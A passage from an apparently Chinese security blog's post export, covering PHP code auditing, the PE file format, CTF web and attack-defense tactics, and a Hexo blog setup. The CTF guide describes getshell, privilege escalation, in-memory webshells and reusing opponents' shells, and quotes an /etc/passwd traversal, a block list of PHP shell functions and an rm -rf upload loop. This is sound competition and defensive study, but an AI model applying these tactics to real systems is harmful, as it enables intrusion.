class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if (isset($_POST[&apos;submit&apos;]) &amp;&amp; !empty($_POST[&apos;user&apos;]) &amp;&amp; !empty($_POST[&apos;pass&apos;])) &#123;</span><br><span class=\"line\">    include_once(&apos;../header.php&apos;);</span><br><span class=\"line\">    if(@$_POST[&apos;captcha&apos;] !== $_SESSION[&apos;captcha&apos;])&#123;</span><br><span class=\"line\">        header(&apos;Location: login.php&apos;);</span><br><span class=\"line\">        exit;</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n<p>这里的问题，在exit之前给<code>$_SESSION[&#39;captcha&#39;]</code> 重新赋新值。</p>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>实际上线的系统一般都是基于框架开发，MVC设计思想的框架设计，一定程度上此测试系统在阅读和审计上面都是一些自行设计的一些问题，到实际项目业务中还是有一定的偏差，但是可以很好的练习PHP代码上的安全编写问题。后续的原创技术文章持续更新。 <strong>（大象安全,注重人才培养和技术分享，感谢关注！）</strong></p>\n","categories":["PHP"],"tags":["PHP","代码审计"]},{"title":"从PHP基础到代码审计","url":"https://www.xjseck.com/2017/09/11/从PHP基础到代码审计/","content":"<h2 id=\"从入坑CTF-web开始\"><a href=\"#从入坑CTF-web开始\" class=\"headerlink\" title=\"从入坑CTF-web开始\"></a>从入坑CTF-web开始</h2><p>一开始是观摩wooyun开始的，从那时开始感觉自己在学习的路上就停不下来了，也是作为“脚本小子”开始，感觉浮躁的不行，再到入坑CTF，认识了更多的人，从被虐开始，也是能让自己停下来，怎么构建自己的技能树，又怎么静下心来积淀，所以决定从头系统的学习PHP到代码审计，看看自己能做多远，少花一点时间划水了。</p>\n<h2 id=\"PHP基础\"><a href=\"#PHP基础\" class=\"headerlink\" title=\"PHP基础\"></a>PHP基础</h2><p>记得最清楚的事情是使用工具爆破网站目录，发现类似<code>url：ip/item/index/</code>或者类似<code>ip/index.php/Controller/index</code> 发现扫描的文件却没有几个，后来发现是MVC的设计系统。<br>这里就打算从撸PHP项目，实现一些简单的项目入手学习，就由浅入深慢慢学习吧，主要参考</p>\n<blockquote>\n<p>高洛峰的《细说PHP》<br>WooYunPages<br>《深入PHP面向对象 模式与实践》</p>\n</blockquote>\n<p>后面的内容会详细介绍<a href=\"http://xjseck.com/category/#PHP\" target=\"_blank\" rel=\"noopener\">PHP</a>基础的一些学习</p>\n<h2 id=\"代码审计\"><a href=\"#代码审计\" class=\"headerlink\" title=\"代码审计\"></a>代码审计</h2><p>主要可以从几方面进行学习总结。</p>\n<ol>\n<li>CTF题目</li>\n<li>乌云案例</li>\n<li>漏洞演示系统 (DVWA SQLI ….)</li>\n<li>开源系统</li>\n<li>审计案例</li>\n</ol>\n<h2 id=\"漏洞总结\"><a href=\"#漏洞总结\" class=\"headerlink\" title=\"漏洞总结\"></a>漏洞总结</h2><ul>\n<li>安装问题</li>\n<li>包含漏洞</li>\n<li>找回密码</li>\n<li>文件上传</li>\n<li>文件操作</li>\n<li>加密函数</li>\n<li>Xss</li>\n<li>SQLinject</li>\n<li>CSRF</li>\n<li>SSRf</li>\n<li>命令执行</li>\n<li>越权</li>\n<li>变量覆盖</li>\n<li>Xpath 注入</li>\n<li>模板注入</li>\n<li>危险函数</li>\n<li>信息泄露</li>\n<li>PHP版本特性</li>\n</ul>\n<h2 id=\"写到最后\"><a href=\"#写到最后\" class=\"headerlink\" title=\"写到最后\"></a>写到最后</h2><p>整个过程持续的时间会比较久，希望自己能够坚持下去，也希望能帮助到有此研究学习意向的 朋友。</p>\n","categories":["PHP"],"tags":["CTF","PHP"]},{"title":"Mini_Project_RCE_理论篇(1)","url":"https://www.xjseck.com/2017/09/09/Mini-Project-RCE-理论篇-1/","content":"<p>作者: tangKID</p>\n<h2 id=\"1-PE结构介绍：\"><a href=\"#1-PE结构介绍：\" class=\"headerlink\" title=\"1.PE结构介绍：\"></a>1.PE结构介绍：</h2><p>PE结构是Windows平台上可执行文件所必须遵循的格式，通俗的说就是后缀为.exe的文件，后期大家在Windows下碰到的各种加壳和脱壳工具的使用和编写过程都离不开PE结构。</p>\n<h3 id=\"1-1PE节区-Section\"><a href=\"#1-1PE节区-Section\" class=\"headerlink\" title=\"1.1PE节区(Section):\"></a>1.1PE节区(Section):</h3><p>.text<br>这个节区存放着程序的代码段的内容。<br>.data<br>这个节区存放着程序的数据段的内容。.idata存放着从终端输入到程序的内容。<br>.rsrc<br>这个节区通常存放着一些模块的资源信息，这个模块通常使用较少.<br>当然在NT中定义了有九种预设定的section的内容，这里介绍的只是比较常见和常用的区段。</p>\n<h3 id=\"1-2PE的历史残留问题\"><a href=\"#1-2PE的历史残留问题\" class=\"headerlink\" title=\"1.2PE的历史残留问题:\"></a>1.2PE的历史残留问题:</h3><p>接触DOS的人看到这里应该就不会觉得陌生了，这里介绍的就是DOS头和DOS存根.<br>PE文件的第一个字节起始于MS-DOS头部，被称作IMAGE_DOS_HEADER(这个结构的具体内容大家上网查询就可以).</p>\n<h3 id=\"1-3PE头-又名NT头\"><a href=\"#1-3PE头-又名NT头\" class=\"headerlink\" title=\"1.3PE头(又名NT头):\"></a>1.3PE头(又名NT头):</h3><p>PE头表示为结构体IMAGE_NT_HEADERS<br>其中IMAGE_NT_HEADERS中包含着另外两个结构体:<br>1.IMAGE_FILE_HEADER   包含一些底层的硬件信息，不是特别常用。<br>2.IMAGE_OPTIONAL_HEADER32 这个结构体是PE中最大的结构体，也是包含了RE中我们比较重要的信息。</p>\n<p>其中比较重要的几项:<br>1、入口点　Entry Point<br>2、文件偏移地址 File Offset<br>3、虚拟地址 Virtual Address 简称:VA<br>4、基地址 ImageBase<br>5、相对虚拟地址 Relative Virual Address 简称:RVA<br>RVA (相对虚拟地址) =VA (虚拟地址)　－　ImageBase (基地址)<br><img src=\"1.png\" alt=\"\"><br>左边是存放在磁盘中，右边是加载到内存中</p>\n<h3 id=\"1-4PE结构在实践中的情况\"><a href=\"#1-4PE结构在实践中的情况\" class=\"headerlink\" title=\"1.4PE结构在实践中的情况:\"></a>1.4PE结构在实践中的情况:</h3><p><img src=\"2.png\" alt=\"\"><br>对一个可执行文件进行PE结构的查看</p>\n<h4 id=\"1-4-1简单的Hello-Word\"><a href=\"#1-4-1简单的Hello-Word\" class=\"headerlink\" title=\"1.4.1简单的Hello Word\"></a>1.4.1简单的Hello Word</h4><p><img src=\"3.png\" alt=\"\"><br>图1.4.1 程序源码</p>\n<p><img src=\"4.png\" alt=\"\"></p>\n<p>图1.4.2二进制打开</p>\n<h4 id=\"1-4-2二进制分析\"><a href=\"#1-4-2二进制分析\" class=\"headerlink\" title=\"1.4.2二进制分析:\"></a>1.4.2二进制分析:</h4><p>(1)看到最开始的”4D 5A”，ASCII码翻译过来就是”MZ”,也就是前面提到的DOS头,从0000000h~00000040h都是DOS头。<br><img src=\"5.png\" alt=\"\"><br>(2)DOS存根就是从00000040h开始直到”PE”之前都是DOS存根。<br><img src=\"6.png\" alt=\"\"><br>(3)从”50 45”(“PE”)开始就是PE头<br><img src=\"7.png\" alt=\"\"><br>(4)从PE头之后往下就是各个节区头，每个节区的起始都是”2E”<br><img src=\"8.png\" alt=\"\"><br>(5)各个节区头之后就是各个节区的二进制表示。</p>\n<h3 id=\"1-5-PE工具的介绍和使用\"><a href=\"#1-5-PE工具的介绍和使用\" class=\"headerlink\" title=\"1.5 PE工具的介绍和使用:\"></a>1.5 PE工具的介绍和使用:</h3><h4 id=\"1-5-1工具PEiD\"><a href=\"#1-5-1工具PEiD\" class=\"headerlink\" title=\"1.5.1工具PEiD:\"></a>1.5.1工具PEiD:</h4><p><img src=\"9.png\" alt=\"\"></p>\n<h4 id=\"1-5-2装载我们前面的Hello-World程序\"><a href=\"#1-5-2装载我们前面的Hello-World程序\" class=\"headerlink\" title=\"1.5.2装载我们前面的Hello World程序:\"></a>1.5.2装载我们前面的Hello World程序:</h4><p><img src=\"10.png\" alt=\"\"></p>\n<p>请注意，PEiD能够分析的C++程序一般在VS2013之后都会显示C++8.0。</p>\n<h4 id=\"1-5-3节查看器\"><a href=\"#1-5-3节查看器\" class=\"headerlink\" title=\"1.5.3节查看器\"></a>1.5.3节查看器</h4><p><img src=\"11.png\" alt=\"\"><br><img src=\"12.png\" alt=\"\"><br>二进制表示中的入口点</p>\n<h4 id=\"1-5-4-PE细节\"><a href=\"#1-5-4-PE细节\" class=\"headerlink\" title=\"1.5.4 PE细节\"></a>1.5.4 PE细节</h4><p><img src=\"13.png\" alt=\"\"></p>\n","categories":["CTF"],"tags":["CTF","RE"]},{"title":"CTF-Web解题思路","url":"https://www.xjseck.com/2017/09/09/CTF-Web解题思路/","content":"<h2 id=\"简要描述\"><a href=\"#简要描述\" class=\"headerlink\" title=\"简要描述\"></a>简要描述</h2><p>入门安全的方式个人感觉还是从CTF来入手，详细的学习路线可以 <strong>知乎</strong>上搜索，这里不再累述。Web方面还可以从wooyun镜像来学习。自己也入坑了差不多两年了，大致的总结一下解题思路和自己的一些心态体会吧。</p>\n<h2 id=\"体会\"><a href=\"#体会\" class=\"headerlink\" title=\"体会\"></a>体会</h2><p>当时是14年入的大学，大一打游戏度过，偶然的机会是15年大二，偶得一个学长带我参加了一下新大的安全比赛，当时的比赛水的不行，都不算是比赛吧，偶然听到了wooyun这个社区，之后就疯狂的百度浏览wooyun，获取WooYun账号，开始水群，就开始各种搜索怎么入门安全，怎么提升技能，听说了CTF，由于新疆的高校也没有CTF比赛，学校以往也是没有学长搞过，只能从网上获取，后面基本上是见到比赛就参加水群，浏览大佬们的博客，关注<a href=\"https://time.xctf.org.cn\" target=\"_blank\" rel=\"noopener\">time-xctf</a>，也是浮躁的不行，也参过一些线下的CTF比赛，基本上是被血虐，其中的收获也是不少的，至少让自己在安全的路上不再是孤独的人。这里就总结一下自己学到的一些套路，也算是为自己吧，毕竟曾经爱过。</p>\n<h2 id=\"套路考察\"><a href=\"#套路考察\" class=\"headerlink\" title=\"套路考察\"></a>套路考察</h2><p>自己相对擅长WEB方面的一些题目，就总结WEB方面的套路，RE逆向的姿势可以参考tangKID小基友的总结。</p>\n<h3 id=\"基础类\"><a href=\"#基础类\" class=\"headerlink\" title=\"基础类\"></a>基础类</h3><p>使用<strong>Burp Suite</strong> 抓包基本上就能看到题目的提示和考察的知识点。<br>主要这类题目包括：<br>1.HTTP 头知识（User-Agent、XFF、referer、cookie、藏flag和自定义的一些header包括响应头）<br>2.URL知识 包括传参数、数组、字符、编码。<br>3.修改数据包绕过waf、防护或后缀名等。</p>\n<h3 id=\"汇总\"><a href=\"#汇总\" class=\"headerlink\" title=\"汇总\"></a>汇总</h3><p>引用P牛总结的题目汇总</p>\n<blockquote>\n<p>一、爆破，包括md5、爆破随机数、验证码识别等<br>二、绕WAF，包括花式绕Mysql、绕文件读取关键词检测之类拦截<br>三、花式玩弄几个PHP特性，包括弱类型，strpos和===，反序列化+destruct、\\0截断、iconv截断、各种协议流<br>四、密码题，包括hash长度扩展、异或、移位加密各种变形、32位随机数过小<br>五、各种找源码技巧，包括git、svn、xxx.php.swp、<em>www</em>.(zip|tar.gz|rar|7z)、xxx.php.bak、xxx.php~<br>六、文件上传，包括花式文件后缀 .php345 .inc .phtml .phpt .phps、各种文件内容检测&lt;?php &lt;? &lt;% <code>&lt;script language=php&gt;</code>、花式解析漏洞、ffmpeg-avi-m3u-xbin<br>七、Mysql类型差异，包括和PHP弱类型类似的特性,0x、0b、1e之类，varchar和integer相互转换<br>八、open_basedir、disable_functions花式绕过技巧，包括dl、mail、imagick、bash漏洞、DirectoryIterator及各种二进制选手插足的方法<br>九、条件竞争，包括竞争删除前生成shell、竞争数据库无锁多扣钱<br>十、社工，包括花式查社工库、微博、QQ签名、whois<br>十一、windows特性，包括短文件名、IIS解析漏洞、NTFS文件系统通配符、::$DATA，冒号截断<br>十二、SSRF，包括花式探测端口，302跳转、花式协议利用、gophar直接取shell等<br>十三、XSS，各种浏览器auditor绕过、富文本过滤黑白名单绕过、flash xss、CSP绕过<br>十四、XXE，各种XML存在地方（rss/word/流媒体）、各种XXE利用方法（SSRF、文件读取）<br>十五、协议，花式IP伪造 X-Forwarded-For/Client-IP/X-Real-IP/CDN-Src-IP、花式改UA，花式藏FLAG、花式分析数据包<br>十六、逻辑错误（用户注册、已存在、长度）<br>十七、ssrf python-django-directory  比如直接127.0.0.1/../../etc/passwd</p>\n</blockquote>\n<h3 id=\"进阶类\"><a href=\"#进阶类\" class=\"headerlink\" title=\"进阶类\"></a>进阶类</h3><p>我们知道了题目的意图，可能是几个点都需要满足或者有好几层再或者是题目的页面功能比较齐全亦或者是有什么黑科技，我们就需要分析、google。先大致分析整个题目的功能和参数，一般的思路是扫描备份文件关注最近爆发的漏洞事件，进行代码分析，这里就包含的知识点就比较多了，考察代码审计的功底了，需要提升代码功底，需要学习PHP基础、MVC设计思想、框架使用，这里的就不展开后面会更新PHP学习到实操的代码审计吧，慢慢积攒吧。</p>\n<h2 id=\"线下的一些总结\"><a href=\"#线下的一些总结\" class=\"headerlink\" title=\"线下的一些总结\"></a>线下的一些总结</h2><h3 id=\"攻防模式一。沙盒模式\"><a href=\"#攻防模式一。沙盒模式\" class=\"headerlink\" title=\"攻防模式一。沙盒模式\"></a>攻防模式一。沙盒模式</h3><p><strong>2016“丝绸之路”杯网络安全精英赛</strong><br>这个算是自己比较正式的CTF线下的比赛了<br>题型 ：贴近实际的目标网站，隐含着花样的拓扑结构，有4个沙盒，各个沙盒可能有关联。</p>\n<p>入手点：一。实际的网站一般会是通用的开源框架，需要掌握流行开源框架的利用的exploit。<br>快速的定位漏洞的位置。<br>一 未果的话，快速扫描目录，是否有信息泄漏，和铭感文件。然后就是定位到后台地址，猜用户名和密码，弱口令是关键。还有待扩思路。</p>\n<p>进入后台之后的思路就是先getshell ，getshell 的思路就是后台的上传漏洞，一般是后台的编辑插件，比如fuck  edit …绕过这些插件的过滤，再者是数据库备份，数据库命令执行等等。<br>提权: 这里如果是window提权首先如果是IIS+2003使用菜刀+pr  或者就是大马+15051exp<br>来提权。如果有防护，使用组建或者免杀等方法提权。<br>获取flag：搜索flag文件，一般是在管理员的桌面。</p>\n<p>最后扩大战果：<br>快速的分析此网站所在的网络环境，是否与其他题有关联，是否还存在内网环境等。<br>信息收集的快速定位与扩大化。</p>\n<p>这次比赛的总结：<br>开始2个小时的沙盒模式，沙盒1——192.168.199.101  提示don’tscan，没有任何 的思路。<br>沙盒2——102  是一个java的题很像线上的比赛题，这里不是很懂javaweb的参数问题就是没有后缀名的内部传参  比如102/order   显示信息 102/oreder/17 显示id为是17的信息，这里不熟悉参数的问题。(赛后才知道貌似是s2漏洞)<br>沙盒3——103  是一个家具站点，asp+iis+2003，从后台弱口令admim admin  进入之后就是上传一个图片马，然后数据库备份，getshell 菜刀连接  不能执行cmd，上传一个cmd 执行命令，不是system 权限，使用菜刀+cmd+pr  提权添加用户，3389连接之后搜索flag ，最后主办方的提示：沙盒3有沙盒1的入口信息，到第二天的直接放出了沙盒1的入口点，是一个菜刀，需要你re一下，检测一下这菜刀的行为，怎么执行的。只get一个flag，并没有做更大化的信息收集，和后续的拓扑扫描。（不足点:后台备份getshell不是很熟，提权也出了一些问题）<br> <a href=\"http://mycms7.cn.adminftp.com/\" target=\"_blank\" rel=\"noopener\">http://mycms7.cn.adminftp.com/</a>   沙盒3测试环境地址</p>\n<p>沙盒4—eshop 一个开源的网店系统3.0版本，follow.php注入漏洞未能触发注入，这里也忘记测试后台是否有弱口令了，经验不足。</p>\n<p>攻防模式二：web+pwn 服务器的组合。<br>环境说明 web服务 首先是一个/home/user1/wwwroot目录下有flag文件<br>Web目录权限是777 没有root权限 mysql 也是user1权限<br>Web 先说一下一开始的环境，php+mysql  权限都是 r_x权限  目录在/home/user1/wwwroot/   一开始web 我们就掉了2次分。首先搜索连接数据库的配置文件，进入数据库，修改后台的默认密码，删除其他必要的用户。然后进入web 目录下，修改目录权限。然后就坐等了一天，竟然web 就再没有掉分，我也很奇怪，人品爆发了。<br>后来听到别人的思路就是一开始，上来，猜出了mysqlroot 的弱口令，udf 提权成功了(不是很清楚)，<br>直接就2000分到手，我很想和师傅们聊聊人生。细节有待实现。<br>正确的思路是：一开始可以先拼一波手速，破解默认的admin密码，直接去后台上传文件，先getshell 再说。实际是是说web至少有5个以上的漏洞，师傅们的思路是，注入到管理员的md5，进后台，上传文件  然后包含getshell。获取权限持续得分。<br>正常的策略是tar 打包web 目录的文件到/tmp 目录下然后  scp  下载下来，审计测试。<br>目录的权限如图<br><img src=\"1.png\" alt=\"\"><br>Wwwroot  权限是7   子目录文件是 r 权限<br>测试udf提权(赛后问了一下大家都没有root)<br>定制脚本优化一下<br>这里修补漏洞的方式：<br>系统防护<br>Netstat  kill  进程<br>自动化脚本<br>暴力删除 敏感文件</p>\n<p>首先备份网站目录，  后续的做diff命令比对，是否被写后门shel了没有l<br> 首先我们写一个脚本<br>把我们防护的脚本包含到php文件中进行防护<br>然后可以写一个定时删除shell 文件的脚本，不允许在文件夹中写入文件</p>\n<p>一：不知道漏洞首先包含php脚本到web文件中做url 参数获取日志后续在分析<br>二：包含waf.php文件做sql注入xss、srf等漏洞的通用防护(做全局变量的防护)<br>三：审计代码发现已知漏洞，做代码上的修补<br>四：做流量的混淆，防止被人流量重放。<br>五：包含自动删除shell脚本<br>六：总结的思路，首先我们可以抓取别人的流量 然后利用别人留下的密码什么<br>比如丝绸杯  我们当时发现我们的admin 表中被添加了用户<br>我们可以用他这用户登录别人的服务器后台，然后再上传shell 什么的</p>\n<p><strong>Web 防护加固实现</strong><br>1.有root、administrator 权限的防护<br>首先环境是phpweb防护，首先直接修改php.ini    修改 设置为安全模式然后直接禁止大小马的函数，<br>disable_functions = passthru,exec,system,chroot,scandir,chgrp,chown,shell_exec,proc_open,proc_get_status,popen,ini_alter,ini_restore,dl,openlog,syslog,readlink,symlink,popepassthru,stream_socket_server<br>然后再开启安全模式<br>pcntl_exec() 可以绕过<br><a href=\"http://security.ctocio.com.cn/tips/5/7764505_5.shtml\" target=\"_blank\" rel=\"noopener\">http://security.ctocio.com.cn/tips/5/7764505_5.shtml</a><br>全部禁止</p>\n<p>2.非root权限的防护<br><a href=\"http://blog.csdn.net/andy1219111/article/details/9054277\" target=\"_blank\" rel=\"noopener\">http://blog.csdn.net/andy1219111/article/details/9054277</a><br>打包web目录文件<br>下载保存扫描是否有内置后门<br>常规的修改默认的用户名和密码</p>\n<ol>\n<li>首先去查看web目录下链接sql的配置文件，获取数据库的密码，然后登陆数据库修改网站的默认后台密码。是否有file权限</li>\n<li>修改web目录下文件的权限，设置600，指定目录的权限设置400等，具体的文件具体设置，或者直接设置upload文件权限为chmod 000</li>\n<li>写一个自动删除shell的php脚本，白名单，自动删除目录下多出来的php文件<br>Watch –n 1 rm –rf uploads  每1秒定时删除uploads 文件</li>\n<li>加载防护waf safe 等php的脚本，抓取流量或者写脚本动态监控 脚本请参考&lt;攻防脚本中的连接地址&gt;</li>\n<li>对特定的漏洞进行代码上的修改补上漏洞。</li>\n<li>如果手速慢了被植入了内存马，一种是分析php-fmp进行进行查看，申请重启服务<br>另一种是，内存马判断文件，可以手动添加一个文件，内容可以随意了，只要存在此文件名的文件就可以了<br>7.如果主办方check的不严就直接删服务<br>8.赛后向主办方申请要自己服务的日志，一定要做赛后总结，日志分析<br>动态监控踩点防护</li>\n<li>使用server.php 抓取 get,post,request等数据包</li>\n<li>Py实施md5 检测目录，是否有新增、改动、减少等文件</li>\n<li>手动检测本地测试<br>具体办法：<br>首先，php文件内容头批量先导入抓数据包的php脚本和waf脚本<br>然后实施动态监控<br>这里功能可以预先集成在一个py 脚本中<br>具体方法和脚本在【加固脚本】文件夹中<br>漏洞查找</li>\n<li><p>首先扫描web文件，是否含有主办方隐藏的后门 附脚本：查找后门木马<br><img src=\"2.png\" alt=\"\"><br>Opensns  这里就印证了主办方留有后门<br>直接<br><img src=\"3.png\" alt=\"\"><br>可以直接刷flag</p>\n</li>\n<li><p>再一系列的防护之后，代码审计是否有包含  命令执行漏洞</p>\n</li>\n<li>确认有漏洞上传的shell到uoload文件<br>一般upload文件是777权限 所以我们可以<br>Watch –n 1 rm –rf  upload   每隔1秒 删除upload文件</li>\n<li>内存马的使用，第三届网络空间大赛中学习到使用内存马+手速的模式，然后使用批量的脚本，感觉很无解</li>\n<li>加载防护日志，抓取流量或者从别人的服务上分析shell使用别人的shell进行批量</li>\n<li>应对备份查找后门，我们可以上传一个具有上传功能的upload.php,再使用内存马来进行隐藏</li>\n<li>高一点的赛事，可能网上难以搜索到现成的exp、poc这时就需要审计代码，一般持续的时间相对比较久。<br>附一下一些通用漏洞<br>列表<br>memcache未授权访问  java反序列(struts2可以细分) jenkis jenkis配置不当<br>心脏出血 nosql未授权 glashfish任意文件读 ms10-070  padding orcles  jdwp调试漏洞 mogodb未授权   iis put解析漏洞  svn信息泄露  redis未授权   域传送 iis短文件名 ElasticSearch漏洞…..  后待续<br>一定好多动手复现，比赛的时候才能拼手速。<br>最后复现P牛的这个漏洞库<br><a href=\"https://github.com/phith0n/vulhub/\" target=\"_blank\" rel=\"noopener\">https://github.com/phith0n/vulhub/</a></li>\n</ol>\n<h2 id=\"线下的经验参考\"><a href=\"#线下的经验参考\" class=\"headerlink\" title=\"线下的经验参考\"></a>线下的经验参考</h2><blockquote>\n<p><a href=\"http://mp.weixin.qq.com/s?__biz=MzIyNTA1NzAxOA==&amp;mid=2650473772&amp;idx=1&amp;sn=383dd\" target=\"_blank\" rel=\"noopener\">http://mp.weixin.qq.com/s?__biz=MzIyNTA1NzAxOA==&amp;mid=2650473772&amp;idx=1&amp;sn=383dd</a></p>\n</blockquote>\n<blockquote>\n<p><a href=\"http://mp.weixin.qq.com/s?__biz=MzI0NTA3NzQ2MQ==&amp;mid=400219727&amp;idx=1&amp;sn=ef52130e5abe78231fc7ecb52dfab30d&amp;scene=23&amp;srcid=0727mNmx7vUY433OxmmAA4qZ#rd\" target=\"_blank\" rel=\"noopener\">http://mp.weixin.qq.com/s?__biz=MzI0NTA3NzQ2MQ==&amp;mid=400219727&amp;idx=1&amp;sn=ef52130e5abe78231fc7ecb52dfab30d&amp;scene=23&amp;srcid=0727mNmx7vUY433OxmmAA4qZ#rd</a></p>\n</blockquote>\n<blockquote>\n<p><a href=\"http://mp.weixin.qq.com/s?__biz=MjM5NjkyMTk5Mg==&amp;mid=200915617&amp;idx=2&amp;sn=50fb575f04e3c5b1acea6dbaf594a0d0&amp;scene=23&amp;srcid=07277VWPlLebnsrF3tO5fBrO#rd\" target=\"_blank\" rel=\"noopener\">http://mp.weixin.qq.com/s?__biz=MjM5NjkyMTk5Mg==&amp;mid=200915617&amp;idx=2&amp;sn=50fb575f04e3c5b1acea6dbaf594a0d0&amp;scene=23&amp;srcid=07277VWPlLebnsrF3tO5fBrO#rd</a></p>\n</blockquote>\n<blockquote>\n<p><a href=\"http://5alt.me/posts/2014/10/AliCTF2014%E5%86%B3%E8%B5%9B%E8%AE%B0%E5%BD%95.html\" target=\"_blank\" rel=\"noopener\">http://5alt.me/posts/2014/10/AliCTF2014%E5%86%B3%E8%B5%9B%E8%AE%B0%E5%BD%95.html</a></p>\n</blockquote>\n<blockquote>\n<p><a href=\"http://mp.weixin.qq.com/s?__biz=MjM5NTU2MTQwNA==&amp;mid=2650652095&amp;idx=2&amp;sn=ba608435b3f215e8c93e58556caa1df3&amp;scene=23&amp;srcid=072784JTwY6uY8ww7yoeU701#rd\" target=\"_blank\" rel=\"noopener\">http://mp.weixin.qq.com/s?__biz=MjM5NTU2MTQwNA==&amp;mid=2650652095&amp;idx=2&amp;sn=ba608435b3f215e8c93e58556caa1df3&amp;scene=23&amp;srcid=072784JTwY6uY8ww7yoeU701#rd</a>    linux  脚本维护系统</p>\n</blockquote>\n<blockquote>\n<p><a href=\"http://weibo.com/p/1001603847172578749357?mod=zwenzhang\" target=\"_blank\" rel=\"noopener\">http://weibo.com/p/1001603847172578749357?mod=zwenzhang</a></p>\n</blockquote>\n<p>这里猥琐的不死马和进程后门</p>\n<blockquote>\n<p><a href=\"http://byd.dropsec.xyz/2017/05/16/CTF%E7%BA%BF%E4%B8%8B%E8%B5%9B%E7%9B%B8%E5%85%B3%E5%B7%A5%E5%85%B7/\" target=\"_blank\" rel=\"noopener\">http://byd.dropsec.xyz/2017/05/16/CTF%E7%BA%BF%E4%B8%8B%E8%B5%9B%E7%9B%B8%E5%85%B3%E5%B7%A5%E5%85%B7/</a></p>\n</blockquote>\n<blockquote>\n<p><a href=\"http://bobao.360.cn/ctf/detail/169.html\" target=\"_blank\" rel=\"noopener\">http://bobao.360.cn/ctf/detail/169.html</a></p>\n</blockquote>\n<blockquote>\n<p><a href=\"https://blog.rexskz.info/index.php/2016-nationwide-ctf-final-writeup.html\" target=\"_blank\" rel=\"noopener\">https://blog.rexskz.info/index.php/2016-nationwide-ctf-final-writeup.html</a></p>\n</blockquote>\n<blockquote>\n<p><a href=\"http://rcoil.me/2017/06/CTF%E7%BA%BF%E4%B8%8B%E8%B5%9B%E6%80%BB%E7%BB%93/\" target=\"_blank\" rel=\"noopener\">http://rcoil.me/2017/06/CTF%E7%BA%BF%E4%B8%8B%E8%B5%9B%E6%80%BB%E7%BB%93/</a></p>\n</blockquote>\n<p><strong>线下的一些脚本上传到了<a href=\"https://github.com/Huseck/CTF\" target=\"_blank\" rel=\"noopener\">github</a>上了大家可以找一下</strong></p>\n","categories":["CTF"],"tags":["CTF","WEB"]},{"title":"博客的搭建过程","url":"https://www.xjseck.com/2017/09/07/博客的搭建过程/","content":"<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>搭建个人博客有两种方式</p>\n<ul>\n<li><strong>第一种</strong><br>使用自己独立的VPS和域名<br>这种的方式就是可扩展的方式很多种，可以直接源码安装管理数据库等，比如安装typecho、WordPress等，如果是只是为了写博文就没有必要选择这种方式了，多花费买VPS的钱了。自行安装配置这里不再累述。</li>\n<li><strong>第二种</strong><br>使用github pages +hexo+域名的方式。<br>这种方式个人感觉比较nice。<br>安装的过程如下<br><strong>前期准备</strong></li>\n<li>Step1<br>先安装git nodejs 的基础上安装 hexo<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#npm install hexo-cli -g</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<p>如果npm安装不了需要使用淘宝的cnpm来代替<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#npm install -g cnpm --registry=https://registry.npm.taobao.org</span><br><span class=\"line\">#cnpm install hexo-cli -g</span><br><span class=\"line\">#hexo -v  //查看一下是否安装成功</span><br></pre></td></tr></table></figure></p>\n<ul>\n<li>Step2<br>然后创建一个hexo<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#cnpm install</span><br><span class=\"line\">或者</span><br><span class=\"line\">#npm install </span><br><span class=\"line\">#hexo init hexo   //这里如果出现不能连接到git上需要使用一下代理 当前目录下创建一个hexo文件里面是hexo源文件</span><br><span class=\"line\">#git config --global https.proxy http://127.0.0.1:1080</span><br><span class=\"line\">#git config --global https.proxy https://127.0.0.1:1080</span><br><span class=\"line\"></span><br><span class=\"line\">然后进入hexo文件下运行</span><br><span class=\"line\">#cd hexo</span><br><span class=\"line\">#cnpm install hexo --save</span><br><span class=\"line\">或者</span><br><span class=\"line\">#npm install hexo --save</span><br><span class=\"line\">本地测试运行hexo</span><br><span class=\"line\">#hexo g</span><br><span class=\"line\">#hexo s</span><br><span class=\"line\">出现</span><br><span class=\"line\">INFO  Start processing</span><br><span class=\"line\">INFO  Hexo is running at http://localhost:4000/. Press Ctrl+C to stop.</span><br><span class=\"line\">说明就成功了</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<h2 id=\"创建github-pages\"><a href=\"#创建github-pages\" class=\"headerlink\" title=\"创建github pages\"></a>创建github pages</h2><p>到这里我们已经本地能运行hexo了，配置好选择好自己喜欢的主题<br>我们创建一个github pages</p>\n<ul>\n<li>Step1<br>点击<br><strong>Create a new repository</strong><br><img src=\"QQ图片20170907231506.png\" alt=\"图片描述\"><br>名字一定要填写你github的名字<br>然后创建选择主题<br>之后访问huseck.github.io，访问自己的</li>\n<li><p>Step2<br>使用git 来管理github的仓库<br>前期需要配置ssh-key 连接到github上</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#ssh-keygen –t rsa –C “邮箱地址” //可以什么都不用填写 把id_rsa.pub 的内容复制到github setting 中的ssh-keys 中</span><br><span class=\"line\">然后git 配置</span><br><span class=\"line\">#git config –global user.name “用户名”</span><br><span class=\"line\">#git config –global user.email “邮箱”</span><br><span 